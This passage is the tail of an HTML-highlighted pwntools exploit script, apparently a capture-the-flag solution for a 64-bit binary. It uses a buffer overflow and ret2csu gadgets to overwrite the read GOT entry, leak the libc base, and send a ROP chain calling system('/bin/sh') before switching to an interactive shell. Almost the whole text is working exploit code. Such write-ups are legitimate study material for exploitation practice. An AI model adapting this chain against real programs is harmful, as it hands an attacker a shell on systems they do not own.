    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">last</span><span class="p">)</span>    
    <span class="k">return</span> <span class="n">payload</span>

<span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">key_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">key_addr</span><span class="o">+</span><span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">#duan()</span>
<span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">key_addr</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="c1">#duan()</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x4a20</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="c1">#duan()</span>

<span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">key_addr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="c1">#duan()</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s2">"libc_base "</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
<span class="c1">#duan()</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">'/bin/sh'</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="sd">'''</span>
<span class="sd">'''</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
</div>